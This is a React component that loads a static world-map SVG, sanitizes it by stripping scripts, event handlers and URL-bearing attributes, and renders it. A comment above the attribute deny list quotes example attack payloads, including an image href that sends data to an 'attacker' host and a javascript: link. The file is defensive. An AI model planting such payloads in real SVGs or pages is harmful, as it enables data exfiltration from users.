"use client";

import { useEffect, useRef } from "react";
import { RequestSequence, isRequestCancellation, requestTextWithResponse } from "@/lib/request";

const STYLE_BLOCK = `
.fiat-world-map{--world-default-fill:oklch(0.79 0.015 248 / 1);--world-stroke:oklch(0.48 0.02 248 / 0.58)}
.dark .fiat-world-map{--world-default-fill:oklch(0.22 0.014 248 / 1);--world-stroke:oklch(0.62 0.02 248 / 0.55)}
.fiat-world-map svg{display:block;width:100%;height:100%}
.fiat-world-map .world-countries{stroke-width:0.7}
`;

// URL-/navigation-bearing attributes that can drive data exfiltration or
// navigation from a poisoned SVG (e.g. <a href="javascript:…">,
// <image href="https://attacker/?data=…">, <use href="#…">). The static
// world-countries map is pure geometry and never needs these.
const UNSAFE_ATTRS = new Set(["href", "xlink:href", "src", "action", "formaction", "data"]);

// Sanitize parsed SVG: strip <script> elements, on* event-handler attributes,
// and URL-/navigation-bearing attributes.
// Defense-in-depth against a poisoned /maps/world-countries.svg response.
function sanitizeSvg(root: Element): void {
  root.querySelectorAll("script").forEach((el) => el.remove());
  const walker = root.ownerDocument.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
  let node: Node | null = root;
  while (node) {
    if (node instanceof Element) {
      for (const attr of Array.from(node.attributes)) {
        const name = attr.name.toLowerCase();
        if (name.startsWith("on") || UNSAFE_ATTRS.has(name)) node.removeAttribute(attr.name);
      }
    }
    node = walker.nextNode();
  }
}

export function WorldMap() {
  const hostRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    const requests = new RequestSequence();
    const host = hostRef.current;
    if (!host) return;

    requests
      .run((signal) => requestTextWithResponse("/maps/world-countries.svg", { signal }))
      .then(({ data: text }) => text)
      .then((text) => {
        if (!text) return;
        // Parse via DOMParser into an isolated XML document, sanitize, then
        // adopt the <svg> node. Avoids `dangerouslySetInnerHTML` entirely.
        const doc = new DOMParser().parseFromString(text, "image/svg+xml");
        const svg = doc.documentElement;
        if (!svg || svg.nodeName.toLowerCase() !== "svg") return;
        sanitizeSvg(svg);
        host.replaceChildren(host.ownerDocument.importNode(svg, true));
      })
      .catch((error) => {
        if (isRequestCancellation(error)) return;
        // swallow: empty atlas is acceptable fallback
      });

    return () => {
      requests.cancel();
    };
  }, []);

  return (
    <div className="fiat-world-map relative h-full w-full" aria-hidden="true">
      <style>{STYLE_BLOCK}</style>
      <div ref={hostRef} className="h-full w-full overflow-hidden [&_svg]:block [&_svg]:h-full [&_svg]:w-full" />
    </div>
  );
}
